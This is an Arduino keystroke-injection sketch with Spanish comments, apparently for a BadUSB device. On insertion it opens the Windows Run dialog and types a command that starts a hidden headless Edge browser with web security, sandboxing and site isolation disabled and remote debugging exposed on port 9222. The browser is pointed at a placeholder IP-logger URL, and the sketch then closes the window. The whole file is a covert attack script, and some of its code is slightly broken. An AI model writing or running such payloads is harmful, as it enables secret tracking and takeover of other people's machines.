#include <Keyboard.h>

void setup() {
  
  string DEALER = "https://<iplogger>/";
  // Esperar un momento para abrir Windows+R
  delay(3000);
  // Pulsar la tecla de Windows
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  // Pulsar la tecla de R
  Keyboard.press('r');
  delay(100);
  // Soltar ambas teclas
  Keyboard.releaseAll();
  delay(1000);
  // Escribir el comando de msedge.exe
  Keyboard.print("msedge.exe --headless --remote-debugging-port=9222 --no-sandbox --disable-setuid-sandbox --disable-web-security --disable-features=IsolateOrigins,site-per-process ");
  Keyboard.print(DEALER); // Aquí se usa la variable DEALER
  Keyboard.println("\"");
  delay(500);
  // Pulsar la tecla Enter
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  // Esperar a que se cargue la página
  delay(3000);
  // Cerrar la ventana de Windows+R
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  delay(100);
  Keyboard.releaseAll();
}

void loop() {
  // Nada que hacer aquí
}
